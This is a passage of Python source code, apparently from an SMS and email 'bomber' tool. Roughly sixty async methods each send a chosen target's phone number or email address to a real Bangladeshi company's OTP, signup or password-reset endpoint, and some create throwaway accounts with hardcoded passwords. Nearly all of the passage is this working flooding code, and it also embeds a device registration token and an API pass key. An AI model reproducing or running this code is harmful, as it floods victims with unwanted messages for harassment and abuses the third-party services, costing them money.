            async with self.session.post(url, json=json.loads('{"operationName":"createCustomerOtp","variables":{"auth":{"countryCode":"880","deviceUuid":"test-device","phone":"{phone}"},"device":null},"query":"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message result { id __typename } statusCode __typename } }"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API62 - Walton Plaza", success, res.status)
                return success
        except Exception:
            await self.log_event("API62 - Walton Plaza", False, "Error")
            return False


    async def api_api63___pbs(self):
        target = self.target
        url = f"https://apialpha.pbs.com.bd/api/OTP/generateOTP".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API63 - PBS", success, res.status)
                return success
        except Exception:
            await self.log_event("API63 - PBS", False, "Error")
            return False


    async def api_api64___aarong(self):
        target = self.target
        url = f"https://mcprod.aarong.com/graphql".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"query":"mutation generateCustomerToken($email: String!, $password: String!, $type: String!, $mobile_number: String!) { generateCustomerToken(email: $email password: $password type: $type mobile_number: $mobile_number) { token message } }","variables":{"email":"","password":"","type":"mobile_number","mobile_number":"{phone}"}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API64 - Aarong", success, res.status)
                return success
        except Exception:
            await self.log_event("API64 - Aarong", False, "Error")
            return False


    async def api_api65___arogga_app(self):
        target = self.target
        url = f"https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API65 - Arogga App", success, res.status)
                return success
        except Exception:
            await self.log_event("API65 - Arogga App", False, "Error")
            return False


    async def api_api66___sundarban_courier(self):
        target = self.target
        url = f"https://api-gateway.sundarbancourierltd.com/graphql".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"operationName":"CreateAccessToken","variables":{"accessTokenFilter":{"userName":"{phone}"}},"query":"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API66 - Sundarban Courier", success, res.status)
                return success
        except Exception:
            await self.log_event("API66 - Sundarban Courier", False, "Error")
            return False


    async def api_api67___quiztime(self):
        target = self.target
        url = f"https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API67 - QuizTime", success, res.status)
                return success
        except Exception:
            await self.log_event("API67 - QuizTime", False, "Error")
            return False


    async def api_api68___dressup(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API68 - DressUp", success, res.status)
                return success
        except Exception:
            await self.log_event("API68 - DressUp", False, "Error")
            return False


    async def api_api69___ghoori_learning(self):
        target = self.target
        url = f"https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API69 - Ghoori Learning", success, res.status)
                return success
        except Exception:
            await self.log_event("API69 - Ghoori Learning", False, "Error")
            return False


    async def api_api70___garibook(self):
        target = self.target
        url = f"https://api.garibookadmin.com/api/v3/user/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API70 - Garibook", success, res.status)
                return success
        except Exception:
            await self.log_event("API70 - Garibook", False, "Error")
            return False


    async def api_api71___fabrilife_signup(self):
        target = self.target
        url = f"https://fabrilifess.com/api/wp-json/wc/v2/user/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API71 - Fabrilife Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("API71 - Fabrilife Signup", False, "Error")
            return False


    async def api_api72___fabrilife_otp(self):
        target = self.target
        url = f"https://fabrilifess.com/api/wp-json/wc/v2/user/phone-login/{target}"
        try:
            async with self.session.post(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API72 - Fabrilife OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API72 - Fabrilife OTP", False, "Error")
            return False


    async def api_api73___btcl_bdia(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API73 - BTCL BDIA", success, res.status)
                return success
        except Exception:
            await self.log_event("API73 - BTCL BDIA", False, "Error")
            return False


    async def api_api74___btcl_phonebill_register(self):
        target = self.target
        url = f"https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API74 - BTCL PhoneBill Register", success, res.status)
                return success
        except Exception:
            await self.log_event("API74 - BTCL PhoneBill Register", False, "Error")
            return False


    async def api_api75___btcl_phonebill_login(self):
        target = self.target
        url = f"https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API75 - BTCL PhoneBill Login", success, res.status)
                return success
        except Exception:
            await self.log_event("API75 - BTCL PhoneBill Login", False, "Error")
            return False


    async def api_api76___redx_merchant_otp(self):
        target = self.target
        url = f"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API76 - RedX Merchant OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API76 - RedX Merchant OTP", False, "Error")
            return False


    async def api_api77___khaasfood_digits_otp(self):
        target = self.target
        url = f"https://www.khaasfood.com/wp-admin/admin-ajax.php".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API77 - KhaasFood Digits OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API77 - KhaasFood Digits OTP", False, "Error")
            return False


    async def api_api78___robi_web_otp(self):
        target = self.target
        url = f"https://www.robi.com.bd/en/v1".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API78 - Robi Web OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API78 - Robi Web OTP", False, "Error")
            return False


    async def api_api79___sindabad_offers_otp_v2(self):
        target = '+88' + self.target
        url = f"https://offers.sindabad.com/api/mobile-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API79 - Sindabad Offers OTP v2", success, res.status)
                return success
        except Exception:
            await self.log_event("API79 - Sindabad Offers OTP v2", False, "Error")
            return False


    async def api_api80___gp_fi_fwa_otp(self):
        target = self.target
        url = f"https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API80 - GP FI FWA OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API80 - GP FI FWA OTP", False, "Error")
            return False


    async def api_api81___kabbik_otp_v2(self):
        target = '88' + self.target
        url = f"https://api.kabbik.com/v1/auth/otpnew2".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"msisdn":"88{phone}","currentTimeLong":" + System.currentTimeMillis() + ","passKey":"GmIRDFRrRyoeLRYq"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API81 - Kabbik OTP v2", success, res.status)
                return success
        except Exception:
            await self.log_event("API81 - Kabbik OTP v2", False, "Error")
            return False


    async def api_api82___sundora_otp_backend(self):
        target = self.target
        url = f"https://otp-backend.fly.dev/api/otp/send".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API82 - Sundora OTP Backend", success, res.status)
                return success
        except Exception:
            await self.log_event("API82 - Sundora OTP Backend", False, "Error")
            return False


    async def api_api83___walton_plaza_otp_v2(self):
        target = self.target
        url = f"https://waltonplaza.com.bd/api/auth/otp/create".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"auth":{"countryCode":"880","deviceUuid":"device-{phone}","phone":"{phone}","type":"LOGIN"},"captchaToken":"no recapcha"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API83 - Walton Plaza OTP v2", success, res.status)
                return success
        except Exception:
            await self.log_event("API83 - Walton Plaza OTP v2", False, "Error")
            return False


    async def api_api84___btcl_mybtcl_register(self):
        target = self.target
        url = f"https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API84 - BTCL MyBTCL Register", success, res.status)
                return success
        except Exception:
            await self.log_event("API84 - BTCL MyBTCL Register", False, "Error")
            return False


    async def api_api85___btcl_mybtcl_bcare(self):
        target = self.target
        url = f"https://mybtcl.btcl.gov.bd/api/bcare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API85 - BTCL MyBTCL Bcare", success, res.status)
                return success
        except Exception:
            await self.log_event("API85 - BTCL MyBTCL Bcare", False, "Error")
            return False


    async def api_api86___ecourier_individual_otp(self):
        target = self.target
        url = f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}"
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API86 - eCourier Individual OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API86 - eCourier Individual OTP", False, "Error")
            return False


    async def api_api87___carrybee_merchant_register(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://api-merchant.carrybee.com/api/v2/merchant/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API87 - Carrybee Merchant Register", success, res.status)
                return success
        except Exception:
            await self.log_event("API87 - Carrybee Merchant Register", False, "Error")
            return False


    async def api_api88___carrybee_forget_password(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://api-merchant.carrybee.com/api/v2/forget-password".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API88 - Carrybee Forget Password", success, res.status)
                return success
        except Exception:
            await self.log_event("API88 - Carrybee Forget Password", False, "Error")
            return False


    async def api_api89___cartup_signup(self):
        target = self.target
        url = f"https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API89 - CartUp Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("API89 - CartUp Signup", False, "Error")
            return False


    async def api_api90___easyfashion_digits_otp(self):
        target = self.target
        url = f"https://easyfashion.com.bd/wp-admin/admin-ajax.php".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API90 - EasyFashion Digits OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API90 - EasyFashion Digits OTP", False, "Error")
            return False


    async def api_api91___sara_lifestyle_otp(self):
        target = self.target
        url = f"https://prod.saralifestyle.com/api/Master/SendTokenV1".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API91 - Sara Lifestyle OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API91 - Sara Lifestyle OTP", False, "Error")
            return False


    async def api_api92___electronics_bangladesh_otp(self):
        target = self.target
        url = f"https://storeapi.electronicsbangladesh.com/api/auth/send-otp-for-login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API92 - Electronics Bangladesh OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API92 - Electronics Bangladesh OTP", False, "Error")
            return False


    async def api_api93___esquire_electronics_check_user(self):
        target = self.target
        url = f"https://api.ecommerce.esquireelectronicsltd.com/api/user/check-user-for-registration".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API93 - Esquire Electronics Check User", success, res.status)
                return success
        except Exception:
            await self.log_event("API93 - Esquire Electronics Check User", False, "Error")
            return False


    async def api_api94___sheba_electronics_otp(self):
        target = self.target
        url = f"https://admin.shebaelectronics.co/api/customer/register/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API94 - Sheba Electronics OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API94 - Sheba Electronics OTP", False, "Error")
            return False


    async def api_api95___sumash_tech_otp(self):
        target = self.target
        url = f"https://www.sumashtech.com/api/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API95 - Sumash Tech OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API95 - Sumash Tech OTP", False, "Error")
            return False


    async def api_api96___volthbd_registration(self):
        target = self.target
        url = f"https://api.volthbd.com/api/v1/auth/registrations".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API96 - VolthBD Registration", success, res.status)
                return success
        except Exception:
            await self.log_event("API96 - VolthBD Registration", False, "Error")
            return False


    async def api_api97___rangs_shop_otp(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://ecom.rangs.com.bd/send-otp-code".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API97 - Rangs Shop OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API97 - Rangs Shop OTP", False, "Error")
            return False


    async def api_api98___eyecon_app_transport(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://api.eyecon-app.com/app/cli_auth/gettransport?cv=vc_510_vn_4.0.510_a&cli=88{target}&reg_id=flycT4-STvehHQq5O2pTcE%3AAPA91bEpVMgtLmd4vxYZn2jSUH7_Stvvp_4Ui19ibI15gcjVJ7G9Vg5fxAW_MWy6bFtw_I67lPVJzJejjACOEBYVW_ww2_RghRxuHqGZxetBbUzt-8uB7HfKx4MM25P7WbZhn0QzGQu6&installer_name=manually+or+unknown+source&n_sims=2&is_sms_sending_available=true&is_whatsapp_installed=true&device_id=473e9a981fddd587&time_zone=Asia%2FDhaka&device_manu=Xiaomi&device_model=Redmi+Note+7+Pro"
        try:
            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API98 - Eyecon App Transport", success, res.status)
                return success
        except Exception:
            await self.log_event("API98 - Eyecon App Transport", False, "Error")
            return False


    async def api_api99___vision_emporium_register(self):
        target = self.target[1:] if self.target.startswith('0') else self.target
        url = f"https://visionemporiumbd.com/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API99 - Vision Emporium Register", success, res.status)
                return success
        except Exception:
            await self.log_event("API99 - Vision Emporium Register", False, "Error")
            return False


    async def api_api100___basa18_sms(self):
        target = self.target
        url = f"https://www.basa18.com/wps/v2/verification/sms/send".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"mobileNum":"{phone}","operationType":5,"countryDialingCode":null}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API100 - BASA18 SMS", success, res.status)
                return success
        except Exception:
            await self.log_event("API100 - BASA18 SMS", False, "Error")
            return False


    async def api_api101___pkluck_register(self):
        target = self.target
        url = f"https://www.pkluck2.com/wps/verification/sms/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API101 - PKLuck Register", success, res.status)
                return success
        except Exception:
            await self.log_event("API101 - PKLuck Register", False, "Error")
            return False


    async def api_api102___pkluck_nologin_otp(self):
        target = self.target
        url = f"https://www.pkluck2.com/wps/verification/sms/noLogin".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API102 - PKLuck NoLogin OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("API102 - PKLuck NoLogin OTP", False, "Error")
            return False


    async def api_api103___8mbets_register(self):
        target = self.target
        url = f"https://www.8mbets.net/api/register/verify".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"username":"user{phone}","email":"","mobileno":"{phone}","new_password":"Password@123","confirm_new_password":"Password@123","currency":"BDT","language":"bn","langCountry":"bn-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API103 - 8MBets Register", success, res.status)
                return success
        except Exception:
            await self.log_event("API103 - 8MBets Register", False, "Error")
            return False


    async def api_api104___8mbets_new_mobile_request(self):
        target = self.target
        url = f"https://www.8mbets.net/api/user/new-mobile-request".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"type":"verify-mobile","username":"user{phone}","language":"bn","langCountry":"bn-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API104 - 8MBets New Mobile Request", success, res.status)
                return success
        except Exception:
            await self.log_event("API104 - 8MBets New Mobile Request", False, "Error")
            return False


    async def api_api105___8mbets_forget_tac(self):
        target = self.target
        url = f"https://www.8mbets.net/api/user/request-forget-tac".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"type":"forget","method":"mobileno","value":"880{phone}","key":"mobileno","language":"bn","langCountry":"bn-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API105 - 8MBets Forget TAC", success, res.status)
                return success
        except Exception:
            await self.log_event("API105 - 8MBets Forget TAC", False, "Error")
            return False


    async def api_api106___jayabaji_register(self):
        target = self.target
        url = f"https://www.jayabaji3.com/api/register/confirm".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"mobileno":"{phone}","username":"user{phone}","firstname":"","new_password":"Password@123","confirm_new_password":"Password@123","country_code":"880","country":"BD","currency":"BDT","ref":"","language":"en","langCountry":"en-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API106 - Jayabaji Register", success, res.status)
                return success
        except Exception:
            await self.log_event("API106 - Jayabaji Register", False, "Error")
            return False


    async def api_api107___jayabaji_new_mobile_request(self):
        target = self.target
        url = f"https://www.jayabaji3.com/api/user/new-mobile-request".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"type":"verify-mobile","username":"user{phone}","language":"en","langCountry":"en-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API107 - Jayabaji New Mobile Request", success, res.status)
                return success
        except Exception:
            await self.log_event("API107 - Jayabaji New Mobile Request", False, "Error")
            return False


    async def api_api108___jayabaji_login_tac(self):
        target = self.target
        url = f"https://www.jayabaji3.com/api/user/request-login-tac".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"uname":"880{phone}","sendType":"mobile","country_code":"880","currency":"BDT","mobileno":"{phone}","language":"en","langCountry":"en-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API108 - Jayabaji Login TAC", success, res.status)
                return success
        except Exception:
            await self.log_event("API108 - Jayabaji Login TAC", False, "Error")
            return False

    # Email APIs

    async def api_email1___bikroy_account(self):
        target = self.target
        url = f"https://bikroy.com/data/account".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"account":{"profile":{"name":"{randomName}","opt_out":false},"login":{"email":"{phone}","password":"Sojib12345"}}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL1 - Bikroy Account", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL1 - Bikroy Account", False, "Error")
            return False


    async def api_email2___bikroy_password_reset(self):
        target = self.target
        url = f"https://bikroy.com/data/password_resets".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"email":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL2 - Bikroy Password Reset", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL2 - Bikroy Password Reset", False, "Error")
            return False


    async def api_email3___busbud_signup(self):
        target = self.target
        url = f"https://www.busbud.com/auth/email-signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"first_name":"Md","last_name":"SOJIB","email":"{phone}","password":"Sojib12345","confirmed_password":"Sojib12345","email_opt_in":false,"locale":"en"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL3 - Busbud Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL3 - Busbud Signup", False, "Error")
            return False


    async def api_email4___mithaibd_register(self):
        target = self.target
        url = f"https://mithaibd.com/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL4 - Mithaibd Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL4 - Mithaibd Register", False, "Error")
            return False


    async def api_email5___saralifestyle_reset(self):
        target = self.target
        url = f"https://prod.saralifestyle.com/api/Master/SendTokenV1".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"userContactNo":"{phone}","userType":"customer","actionFor":"r"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL5 - Saralifestyle Reset", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL5 - Saralifestyle Reset", False, "Error")
            return False


    async def api_email6___tohfay_register(self):
        target = self.target
        url = f"https://www.tohfay.com/user/register.html".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL6 - Tohfay Register", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL6 - Tohfay Register", False, "Error")
            return False


    async def api_email7___tohfay_forgot(self):
        target = self.target
        url = f"https://www.tohfay.com/forgot-password.html".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL7 - Tohfay Forgot", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL7 - Tohfay Forgot", False, "Error")
            return False


    async def api_email8___mrmedicinemart_signup(self):
        target = self.target
        url = f"https://www.mrmedicinemart.com/web/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL8 - MrMedicineMart Signup", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL8 - MrMedicineMart Signup", False, "Error")
            return False


    async def api_email9___mrmedicinemart_reset(self):
        target = self.target
        url = f"https://www.mrmedicinemart.com/web/reset_password".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL9 - MrMedicineMart Reset", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL9 - MrMedicineMart Reset", False, "Error")
            return False


    async def api_email10___robishop_create(self):
        target = self.target
        url = f"https://api.robishop.com.bd/api/user/create".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"customer":{"email":"{phone}","firstname":"{randomName}","lastname":"{randomName}","custom_attributes":{"mobilenumber":"{randomPhone}"}},"password":"Sojib12345"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL10 - Robishop Create", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL10 - Robishop Create", False, "Error")
            return False


    async def api_email11___robishop_reset(self):
        target = self.target
        url = f"https://api.robishop.com.bd/api/user/reset-password".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"email":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL11 - Robishop Reset", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL11 - Robishop Reset", False, "Error")
            return False


    async def api_email12___singerbd_otp(self):
        target = self.target
        url = f"https://www.singerbd.com/api/auth/otp/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"login":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL12 - SingerBD OTP", success, res.status)
                return success
        except Exception:
            await self.log_event("EMAIL12 - SingerBD OTP", False, "Error")
            return False


    async def api_email13___potakait_register(self):
        target = self.target
        url = f"https://potakait.com/account/register".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL13 - Potakait Register", success, res.status)
                return success
        except Exception:
